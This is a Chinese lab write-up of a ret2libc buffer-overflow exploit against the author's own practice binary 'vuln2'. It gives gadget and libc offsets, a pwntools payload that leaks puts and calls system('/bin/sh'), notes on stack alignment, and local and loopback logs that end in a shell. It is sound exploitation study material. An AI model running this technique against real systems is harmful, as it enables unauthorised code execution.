# M3 · 02 — ret2libc：从本地到远程，栈对齐与 libc 反查踩坑

> 目标程序：`vuln2`（自编译，`-O0 -no-pie -fno-stack-protector`，**不**加 `-z execstack`）
> 利用链：`puts(puts@got)` 泄露 libc → 反查基址 → `ret+ret + pop rdi; "/bin/sh" + system`
> 报告日期：2026-09-24；本文即 Writeup #4 的雏形。

---

## 1. 范围（Scope）

与 01 同一漏洞模式，但**把 ret2text 和 shellcode 两条路全部堵死**，只留 ret2libc：

| 差异点 | 01(vuln) | 02(vuln2) | 目的 |
|---|---|---|---|
| 后门函数 | 有 `win()` 调 `system` | **无** | 二进制里不存在现成 shell 代码 |
| NX | 关（`-z execstack`，RWX 段） | **开**（不加 `-z execstack`） | 栈不可执行，shellcode 路线堵死 |
| gadget | 只需 `ret` | 需 `pop rdi; ret` | 必须会搭 ROP 链 |

`evidence/00-file-checksec.txt`：
```
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled          <-- 与 01 的本质区别
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

> 注：虽然 checksec 显示 `SHSTK/IBT: Enabled`（gcc 默认 `-fcf-protection` 写入的 `.note.gnu.property`），
> 但本机内核/glibc 未启用 shadow stack 强制，ROP 链实际可用——实验证据见 §4。

---

## 2. 证据（Evidence）

### 2.1 同样的漏洞
`evidence/ghidra-decomp.c`：
```c
void vuln(void)
{
  undefined1 local_48 [64];
  printf("input> ");
  fflush(stdout);
  read(0,local_48,0x100);          // 256 读进 64
  printf("you said: %s\n",local_48);
}
```
`evidence/05-vuln-disasm.txt` 中 `lea rax,[rbp-0x40]; mov edx,0x100; call read@plt` 与 01 完全同构，偏移同为 **72**。

gcc 同样告警：`vuln2.c:30:5: warning: 'read' writing 256 bytes into a region of size 64`。

### 2.2 二进制侧全部地址（No-PIE，无需泄露）
`evidence/01-nm-symbols.txt` + `evidence/03-gadgets.txt` + `evidence/04-got-relocations.txt`：

| 名称 | 地址 | 来源 |
|---|---|---|
| `ret`（裸） | `0x40101a` | ROPgadget（81 条 gadget 中筛选） |
| `pop rdi ; ret` | `0x4011be` | ROPgadget |
| `puts@plt` | `0x401084` | objdump `<puts@plt>` |
| `puts@got` | `0x404000` | objdump -R：`R_X86_64_JUMP_SLOT puts@GLIBC_2.2.5` |
| `vuln` | `0x4011c3` | nm |
| `pop_rdi_ret`（函数） | `0x4011b6` | nm |

`pop rdi; ret` 来自源码里显式写的那段内联汇编函数 `pop_rdi_ret`。`evidence/06-pop_rdi-disasm.txt` 逐字节展示它的落地：

```
00000000004011b6 <pop_rdi_ret>:
  4011b6: f3 0f 1e fa   endbr64
  4011ba: 55            push rbp
  4011bb: 48 89 e5      mov rbp,rsp
  4011be: 5f            pop rdi        <-- 0x4011be 即 gadget 入口
  4011bf: c3            ret
```

> 真实 CTF 题里这类 gadget 是"顺手捡来的"——从 `__libc_csu_init` 之类的大代码片段里翻出来的。这里为了让注意力集中在 ROP 链本身而显式写出，但定位手法一模一样：`ROPgadget --binary vuln2 | grep "pop rdi"`。

### 2.3 libc 侧偏移（按 BuildID 反查）
`evidence/07-libc-offsets.txt`：
```
libc: /usr/lib/x86_64-linux-gnu/libc.so.6
Build ID: a4a7992a8e66555c8141ab2a08a8465ff6e0ea65
md5: 0d071be36a77f5c2bde1023f3fa81fa0

puts@@GLIBC_2.2.5     = 0x87cc0
system@@GLIBC_2.2.5   = 0x58750
execve@@GLIBC_2.2.5   = 0xef030
"/bin/sh"            = 0x1cc42f
```

拿到 `puts` 运行期地址后：
```
libc_base = leak_puts - 0x87cc0
system    = libc_base + 0x58750
"/bin/sh"  = libc_base + 0x1cc42f
```

---

## 3. 踩坑记录（本文核心）

### 3.1 坑一：`Ghidra` headless 拒绝中文路径
首次给 `vuln2` 跑 headless 分析，退出码 1、末尾 Java 堆栈异常。原因是 import 路径经 junction `D:\rev` 解析回升真实中文路径 `D:\逆向\...`，Ghidra 12.x 在此环境下不稳。

**解法**：先把二进制复制到 ASCII 中转目录再分析：
```powershell
Copy-Item "D:\逆向\逆向学习\practice\pwn-practice\02-ret2libc\vuln2" "D:\m3test\vuln2"
```
之后 headless 一次成功，产出就是 `evidence/ghidra-decomp.c`。

### 3.2 坑二：`checksec` 在非交互脚本里 not found
`checksec` 装在 `~/.local/bin`，`bash script.sh`（非 login shell）不含该目录，导致 `evidence/00-file-checksec.txt` 一度只留下一行 `checksec: command not found`。
**解法**：采集脚本开头 `export PATH="$HOME/.local/bin:$PATH"`。

### 3.3 坑三：exec 层吞掉 `2>/dev/null`
`ROPgadget --binary vuln2 2>/dev/null | grep ... > evidence/03-gadgets.txt` 生成 0 字节文件。
**解法**：重定向写中间文件，再逐步 grep；`head -n` 代替 `head -N`。

### 3.4 坑四（最重要）：两次进入 `vuln`，栈对齐状态会翻转

这是 ret2libc 比 ret2text 更容易栽的地方，因为**要两次经过 `vuln`**：

| 阶段 | 如何进入 `vuln` | 进入时 `rsp` 状态 |
|---|---|---|
| 第 1 次 | `main` 用 `call vuln` | `rsp ≡ 8 (mod 16)`（ABI 正常） |
| 第 2 次 | stage1 的 `ret` 跳回 `vuln` | `rsp ≡ 0 (mod 16)` ← **翻转了** |

原因：`main` `call` 压栈 8 字节，而 ROP 里的 `ret` 弹栈同样 8 字节，但两者之前的对齐状态不同——第一次进 `vuln` 前栈是对齐的，而 stage1 的 ROP 链在 `puts` 返回后栈指针位置与"call 进 vuln"时相差 8。

**后果**：stage2 若只垫 1 个 `ret`（照抄 01 的经验），`system` 入口 `rsp ≡ 0`，`movaps` 必崩。必须垫 **2 个** `ret`：
```python
payload = flat({
    OFFSET: [
        RET,                     # ① 把 stage1 造成的 8 字节翻转补回来
        RET,                     # ② 常规 16 字节对齐
        POP_RDI,                 # rdi = "/bin/sh"
        libc_base + LIBC_BINSH,
        libc_base + LIBC_SYSTEM,
    ]
})
```

`evidence/exp-ret2libc-local-run.log` 与 `exp-ret2libc-remote-run.log` 均显示链完整跑通，证明双 `ret` 是必要条件。

---

## 4. 利用执行结果

### 4.1 本地模式
`evidence/exp-ret2libc-local-run.log`：
```
[x] Starting local process './vuln2': pid 43
[+] leaked puts@libc = 0x71ad0d287cc0
[+] libc base       = 0x71ad0d200000
[+] system@libc     = 0x71ad0d258750
[+] "/bin/sh"@libc  = 0x71ad0d3cc42f
uid=1001(lzq) gid=1002(lzq) groups=1002(lzq),27(sudo)
===RET2LIBC_SHELL_WORKS===
```

### 4.2 远程模式（socket）
`serve.py` 用 `os.read(fd)` 实时转发 stdin/stdout，模拟一个真实远程服务：
```
$ (python3 serve.py 9999 &)  && python3 exp_ret2libc.py remote
```
`evidence/exp-ret2libc-remote-run.log`：
```
[*] listening on 0.0.0.0:9999 (one-shot)
[+] connection from ('127.0.0.1', 39640)
[x] Opening connection to 127.0.0.1 on port 9999: Done
[+] leaked puts@libc = 0x73abc9887cc0
[+] libc base       = 0x73abc9800000
[+] system@libc     = 0x73abc9858750
[+] "/bin/sh"@libc  = 0x73abc99cc42f
uid=1001(lzq) gid=1002(lzq) groups=1002(lzq),27(sudo)
===RET2LIBC_SHELL_WORKS===
```

**本地与远程逐字节同链**，唯一差别是通信从 pipe 换成 TCP socket。这验证了"泄露链与传输层无关"。

---

## 5. 结论（Conclusion）

| # | 结论 | 证据 |
|---|---|---|
| C1 | 漏洞与 01 同构：`read(0,buf,256)` → `char buf[64]`，偏移 72 | 2.1 Ghidra/objdump + gcc 告警 |
| C2 | NX 开启且无后门函数，shellcode 与 ret2text 均不可行，必须 ret2libc | §1 checksec |
| C3 | 取 libc 地址的唯一入口是 `puts@plt(puts@got)`：Partial RELRO 下 GOT 未延迟绑定风险低，且程序启动后已调用过 `puts`，GOT 内是真实 libc 地址 | 2.2 `objdump -R` 显示 `puts@GLIBC_2.2.5 @ 0x404000` |
| C4 | libc 反查靠 BuildID + `readelf -sW` 取符号偏移，非猜版本 | 2.3 BuildID `a4a7992a...` + 三个偏移 |
| C5 | stage2 必须垫 **2 个** `ret`：第 1 个修复"ret 回 vuln 造成的对齐翻转"，第 2 个做常规 16 字节对齐 | 3.4 分析 + §4 实跑通 |
| C6 | 完整链本地/远程均拿 `uid=1001(lzq)` shell | §4 两段日志 |

### 从本题推广的通用步骤
1. `checksec` + `nm` + `ROPgadget` 摸清缓解与可用 gadget；
2. 反编译确认溢出点，cyclic 定偏移；
3. 找一个"能打印指针"的函数（`puts`/`write`）+ 对应 GOT 项，做 **任意地址读**泄露 libc；
4. 泄露值 − 已知符号偏移 = libc base，再算出 `system` 与 `"/bin/sh"`；
5. 第二次进漏洞函数，搭 `pop rdi` 链；**每次重入都重新数栈对齐**，垫够 `ret`；
6. 本地 `process()` 调通后再换 `remote()`，验证与传输层无关。

---

## 6. 复现（Reproduction）

```bash
cd practice/pwn-practice/02-ret2libc
bash build.sh                       # 编译（NX 保持开启）

# 本地
python3 exp_ret2libc.py             # 或 python3 exp_ret2libc.py local

# 远程：一个终端起服务，一个终端跑 exp
python3 serve.py 9999
python3 exp_ret2libc.py remote
```

---

## 7. 文件清单
```
02-ret2libc/
├── vuln2.c / vuln2      # 源码 + 编译产物
├── build.sh             # 编译脚本（刻意不加 -z execstack）
├── exp_ret2libc.py      # 两段式利用（local / remote）
├── serve.py             # 本地 socket 服务端，模拟远程环境
├── report.md            # 本报告（Writeup #4 雏形）
└── evidence/
    ├── 00-file-checksec.txt
    ├── 01-nm-symbols.txt
    ├── 02-objdump-disasm.txt
    ├── 03-gadgets.txt / 03-gadgets-full.txt
    ├── 04-got-relocations.txt       # puts@got / read@got
    ├── 05-vuln-disasm.txt
    ├── 06-pop_rdi-disasm.txt        # pop rdi; ret gadget 落地反汇编
    ├── 07-libc-offsets.txt          # BuildID + 符号偏移 + "/bin/sh" 偏移
    ├── exp-ret2libc-local-run.log
    ├── exp-ret2libc-remote-run.log
    └── ghidra-decomp.c
```